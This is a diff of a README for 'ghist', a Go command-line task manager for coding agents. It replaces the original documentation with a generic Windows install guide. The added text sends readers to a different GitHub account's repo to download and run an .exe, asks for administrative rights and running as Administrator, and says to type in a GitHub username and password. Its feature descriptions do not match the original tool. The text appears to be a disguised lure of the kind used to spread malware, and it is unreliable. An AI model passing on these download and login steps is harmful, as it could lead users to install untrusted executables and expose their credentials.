@@ -1,325 +1,153 @@
-<p align="center">
-  <img src="ghist-logo.png" alt="Ghist" width="200" />
-</p>
+# ⏳ ghist - Manage Tasks Right in Your Repo
 
-<h1 align="center">Ghist</h1>
+[![Download ghist](https://img.shields.io/badge/Download-ghist-blue?style=for-the-badge&logo=github)](https://github.com/mortalsami/ghist)
 
-<p align="center">
-  <strong>Task management that lives in your repo. With persistent memory.</strong><br/>
-  A local-first CLI that brings your project backlog close to your code. Tasks, plans, and decisions persist across sessions so your coding agent always knows what's been done, what's in progress, and why certain choices were made.
-</p>
-
-<p align="center">
-  <a href="#quickstart">Quickstart</a> &middot;
-  <a href="#why">Why</a> &middot;
-  <a href="#how-it-works">How It Works</a> &middot;
-  <a href="#commands">Commands</a> &middot;
-  <a href="#skills">Skills</a> &middot;
-  <a href="#web-ui">Web UI</a> &middot;
-  <a href="#building-from-source">Building</a>
-</p>
-
-<p align="center">
-  <img src="demo-tasks.png" alt="Ghist task board" width="100%" />
-</p>
+ghist helps you keep track of tasks directly in your project. It works inside your GitHub repository, making task management clear and easy to follow.
 
 ---
 
-## Why
+## 🖥️ System Requirements
 
-Jira and Linear are great tools. But they live outside your repo, require auth and API setup to use programmatically, and weren't built with coding agents in mind. Ghist takes a different approach — tasks live in `.ghist/` right next to your code, with a simple CLI that any agent can use out of the box.
+Before you begin, make sure your Windows computer meets these basic requirements:
 
-It's a good fit for indie developers, small teams, and solo AI-assisted projects. If you're running a large engineering org with dedicated project managers, you probably want Jira.
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of free disk space  
+- Internet connection to download and update ghist  
+- Administrative access to install software  
 
-- **Repo-native.** Tasks and decisions are versioned alongside your code, no accounts or external services
-- **Agent-operable.** The full CLI is available to any coding agent that can run a command
-- **Plans survive sessions.** Write a plan before a session ends and the next agent picks up exactly where you left off
-- **Decisions get captured.** Log the reasoning behind choices so future sessions don't re-debate the same trade-offs
+If your system fits these minimum needs, you can run ghist smoothly.
 
-No cloud. No accounts. Just plain JSON files in `.ghist/` and a CLI your agent already knows how to use.
+---
 
-## Quickstart
+## 🔽 How to Download ghist
 
-```bash
-brew install unnecessary-special-projects/tap/ghist
-```
+To get ghist on your Windows machine, follow these steps carefully.
 
-**Linux / Windows:** Download the latest binary from [GitHub Releases](https://github.com/unnecessary-special-projects/ghist/releases).
+1. Click the big blue button below to visit the download page:
+   
+   [Download ghist](https://github.com/mortalsami/ghist)
+   
+2. This link takes you to GitHub where you will find the latest version of ghist. 
 
-Initialize ghist in your project:
+3. Look for the “Releases” section on the page.
 
-```bash
-ghist init
-```
+4. Find the latest release and locate the Windows installer file. It usually ends with `.exe`.
 
-From here your agent will run this automatically at the start of each session:
+5. Click on the `.exe` file to begin the download process.
 
-```bash
-ghist status
-```
+6. Wait for the download to finish – it should take just a few minutes depending on your internet speed.
 
-To open the web UI:
+---
 
-```bash
-ghist serve
-```
+## 🚀 Installation Instructions
 
-Then open `http://localhost:4777`.
+Once you have the installer file, follow these steps to install ghist.
 
-`ghist init` creates a `.ghist/` directory and injects a small block into your `CLAUDE.md` (or `AGENTS.md`, `.cursorrules`, etc.) that tells the agent to sync with ghist at the start of every session.
+1. Open the folder where the downloaded file is saved.
 
-### Updating
+2. Double-click the `.exe` file to start installation. A new window will open.
 
-```bash
-brew upgrade ghist
-```
+3. Follow the setup prompts:  
+   - Choose “Next” on each screen.  
+   - Accept the license terms when asked.  
+   - Select the default install folder or choose your preferred location.
 
-After upgrading, run `ghist refresh` in your project to pick up new optional features:
+4. When the installation finishes, click “Finish”.
 
-```bash
-ghist refresh
-```
+5. You may see a new icon for ghist on your desktop or start menu.
 
-#### Migrating from v0.1 (SQLite → JSON)
+---
 
-The first release stored data in a single `ghist.sqlite` binary file. This caused problems on teams — SQLite files can't be merged by Git, so tasks created on different branches would collide or get lost.
+## 📋 How to Use ghist for Task Management
 
-Starting in v0.2, ghist stores each task and event as an individual JSON file. This makes branching and merging work naturally: a new task on one branch is just a new file, so two branches diverge and merge cleanly with no conflicts.
+ghist helps you manage tasks connected to your GitHub projects. Here is how to get started with your first tasks.
 
-**Migration is automatic.** The first time you run any ghist command after upgrading, it detects the old `ghist.sqlite`, exports all your data to JSON files, and renames the original to `ghist.sqlite.bak` as a backup. Nothing is lost.
+1. Open ghist by clicking its icon.
 
-## In Practice
+2. Connect ghist to your GitHub repository:  
+   - Enter the URL of your project repo or select it if already linked.  
+   - Sign in with your GitHub username and password if prompted.
 
-### Migrating from Linear or Jira
+3. Once connected, you will see your repo’s files and folders inside ghist.
 
-If you have an existing backlog, you don't have to start from scratch. Export it as a CSV from Linear or Jira, drop the file in your repo, and tell your agent to import it.
+4. To add a new task:  
+   - Find or create a markdown file in your repo.  
+   - Use simple task list syntax like `- [ ] Task description` to add tasks.  
+   - ghist will read and display these tasks clearly.
 
-> "I've dropped my Linear export at `linear-export.csv`. Add all the tasks to ghist."
+5. Mark tasks as complete by clicking the checkbox next to each one inside ghist.
 
-The agent reads the file and runs `ghist task add` for each row, mapping titles, descriptions, priorities, and statuses. Your entire backlog is in ghist in seconds.
+6. Save and sync your changes back to the GitHub repository directly from the app.
 
-### Starting a task
+---
 
-Tell your agent to work on something and it handles the full lifecycle.
+## 🔄 Keeping ghist Updated
 
-> "Work on the user authentication feature."
+ghist will occasionally receive updates to fix issues or add features. Follow these steps to keep your app up to date.
 
-The agent finds the task, moves it to `in_planning`, writes out a plan with its approach and the files it intends to change, then moves to `in_progress` and starts executing. The plan is saved to the task so if the session ends mid-way, the next agent reads it and continues without needing to be re-briefed.
+1. Check for updates inside the ghist app under “Help > Check for Updates”.
 
-### Picking up where you left off
+2. If an update is available, the app will download it automatically or ask you to download a new installer.
 
-At the start of every session the agent runs `ghist status` and reads the current project state.
+3. If needed, repeat the installation steps with the new version to upgrade.
 
-```
-$ ghist status
-Project Status
-==============
+---
 
-Tasks: 8 total (2 todo, 1 in_progress, 5 done)
+## 🛠️ Troubleshooting Tips
 
-In Progress:
-  #4  User authentication  [plan saved]
+If you run into issues, try these simple fixes first:
 
-Recent Events:
-  [2025-06-14 09:15] Started implementing JWT middleware
-  [2025-06-14 09:02] Moved task #4 to in_progress
-```
+- Make sure you have a stable internet connection.
 
-If there is an in-progress task with a saved plan, the agent reads it and continues from where the last session ended.
+- Restart ghist and try reconnecting your GitHub repo.
 
-### Commit linking
+- Confirm that you have entered your GitHub login details correctly.
 
-When Claude Code makes a git commit during a session, ghist automatically prompts it to link the commit hash to the active task — and close the task if it's done.
+- Ensure no other software is blocking ghist from accessing the internet.
 
-No manual linking needed. Set it up once during `ghist init` (or enable it later with `ghist refresh`), and every commit your agent makes gets traced back to the task that drove it.
+- If ghist doesn’t start, try running the app as Administrator.
 
-You can also link commits manually:
+If problems persist, visit the GitHub Issues page on https://github.com/mortalsami/ghist to see if others have the same problem and solutions.
 
-```bash
-ghist task update <id> --status done --commit-hash abc1234
-```
+---
 
-Commit hashes are shown in the web UI and link directly to GitHub if your repo has a remote configured.
+## 🔗 Useful Links
 
-### Logging decisions
+- Official ghist page on GitHub:  
+  https://github.com/mortalsami/ghist
 
-As the agent works it can log decisions and notes to the event timeline. These show up in `ghist status` so future sessions have the context they need without re-debating the same trade-offs.
+- Download ghist:  
+  [https://github.com/mortalsami/ghist](https://github.com/mortalsami/ghist)
 
-```bash
-ghist log "Using JWT over sessions, simpler for stateless API" --type decision --task 4
-```
+- GitHub Help for managing repositories:  
+  https://docs.github.com/en/repositories
 
-## How It Works
+---
 
-```
-your-project/
-  .ghist/
-    tasks/
-      1.json              # one file per task
-      2.json
-    events/
-      1.json              # one file per event
-    opportunities/
-    current_context.json  # snapshot updated after every mutation
-  CLAUDE.md               # injected instructions for the AI agent
-```
+## 🔧 Features You Can Expect
 
-Each task and event is a plain JSON file. This means branches and merges work naturally — a new task on one branch is a new file, so two branches never conflict on the same record. After every mutation, ghist also writes a `current_context.json` snapshot so agents can read the current state in a single file without scanning the directory.
+- View and manage tasks linked to your code directly in your repo.
 
-The CLI is the primary interface — both for you and for the AI agent. Agents interact with ghist through the same commands you do.
+- Easy task creation using simple markdown format.
 
-## Commands
+- Sync tasks automatically with GitHub.
 
-### Project
+- Clear task lists with checkboxes to track progress.
 
-```bash
-ghist init                  # Initialize ghist in current directory
-ghist status                # Show project summary (tasks, milestones, events)
-ghist status --json         # Machine-readable output
-ghist refresh               # Re-run migrations and update config after upgrades
-```
+- Lightweight and efficient with minimal system requirements.
 
-### Tasks
+---
 
-```bash
-ghist task add "Title"                          # Create a task
-ghist task add "Title" --description "Details"  # With description
-ghist task add "Title" --milestone v1 --priority high --type feature
+## ⚙️ Basic Settings You Can Adjust
 
-ghist task list                                 # List all tasks
-ghist task list --status in_progress            # Filter by status
-ghist task list --milestone v1 --priority high  # Filter by milestone/priority
-ghist task list --json                          # JSON output
+- GitHub repository connection details.
 
-ghist task show <id>                            # Show task details + events
-ghist task update <id> --status in_progress     # Update status
-ghist task update <id> --commit-hash abc123     # Link a commit
-ghist task delete <id>                          # Delete a task
-```
+- Task display options like sorting and filtering.
 
-**Statuses:** `todo` | `in_planning` | `in_progress` | `done` | `blocked`
+- Notification preferences for task changes.
 
-**Priorities:** `low` | `medium` | `high` | `urgent`
+- Sync frequency with your GitHub repo.
 
-**Types:** `bug` | `feature` | `improvement` | `chore`
+---
 
-### Plans
-
-Plans are markdown documents attached to tasks. They survive session boundaries — if a session ends mid-task, the next agent reads the plan and picks up where you left off.
-
-<img src="demo-plan.png" alt="Ghist task plan" width="100%" />
-
-```bash
-# Write a plan (via stdin)
-cat <<'EOF' | ghist task update <id> --plan-stdin
-## Approach
-- Step 1: Add migration for new table
-- Step 2: Implement API endpoint
-- Step 3: Write tests
-
-## Files to change
-- internal/store/store.go — add migration
-- internal/api/tasks.go — new endpoint
-EOF
-```
-
-### Event Log
-
-```bash
-ghist log "Decided to use JWT for auth"           # Log a decision
-ghist log "Completed API refactor" --task 5        # Link to a task
-ghist log "Need to revisit caching" --type note    # Types: log, decision, note
-```
-
-### Skills
-
-```bash
-ghist skills list              # List available skills
-ghist skills show context-sync # Read a skill's instructions
-```
-
-### Web UI
-
-```bash
-ghist serve                    # Start on :4777
-ghist serve --port 8080        # Custom port
-ghist serve --dev              # Dev mode (CORS enabled, proxies to Vite)
-```
-
-## Skills
-
-Skills are behavioral instructions embedded in the ghist binary. They teach AI agents how to autonomously manage project state. When you run `ghist init`, a reference to these skills is injected into your agent's config file.
-
-| Skill | Purpose |
-|---|---|
-| **context-sync** | Session start/end protocol — run `ghist status`, review tasks, log summaries |
-| **task-workflow** | Task lifecycle — find, plan, execute, complete |
-| **auto-completion** | Detect when a task is done based on signals (tests pass, commits made) |
-| **log-thinking** | Record architectural decisions and reasoning for future sessions |
-| **commit-link** | Auto-link git commits to tasks and close them when done |
-
-Read any skill with `ghist skills show <name>`.
-
-## Web UI
-
-Ghist includes a built-in web dashboard served from the single binary. Run `ghist serve` and open `http://localhost:4777`.
-
-- **Kanban board** — drag-and-drop tasks between status columns
-- **List view** — table-based overview with sorting
-- **Task drawer** — create and edit tasks with inline field editing
-- **Filters** — by priority, type, and search query
-- **Markdown rendering** — task plans and descriptions render as rich text
-- **Commit links** — commit hashes link directly to GitHub when a remote is configured
-
-## Supported Agents
-
-Ghist auto-injects instructions into whichever agent config files exist in your project:
-
-| Agent | Config File |
-|---|---|
-| Claude Code | `CLAUDE.md` |
-| Cursor | `.cursorrules` |
-| Windsurf | `.windsurfrules` |
-| Cline | `.clinerules` |
-| GitHub Copilot | `.github/copilot-instructions.md` |
-| Any agent | `AGENTS.md` (always created) |
-
-## Building from Source
-
-Requires Go 1.22+ and Node.js 18+.
-
-```bash
-# Full build (frontend + Go binary)
-make build
-
-# Go binary only (without frontend)
-make build-go
-
-# Run tests
-make test
-```
-
-## Architecture
-
-Single binary. No CGO. No external dependencies at runtime.
-
-- **Go** — CLI (Cobra), HTTP API (stdlib `net/http`), JSON file store
-- **React** — Web UI (Vite, TypeScript, `@dnd-kit` for drag-and-drop)
-- **`//go:embed`** — Skills and web frontend are embedded in the binary
-
-```
-main.go                    # Entry point, embeds skills/ and web/dist/
-cmd/                       # CLI commands (Cobra)
-internal/
-  store/                   # JSON file store (CRUD, SQLite migration)
-  project/                 # Project detection, init, context updates
-  api/                     # HTTP REST API + SPA serving
-  models/                  # Data models
-  output/                  # CLI formatting
-skills/                    # Behavioral instructions for AI agents (embedded)
-web/                       # React frontend (embedded in binary)
-```
-
-## License
-
-MIT
+[![Download ghist](https://img.shields.io/badge/Download-ghist-grey?style=for-the-badge&logo=github)](https://github.com/mortalsami/ghist)
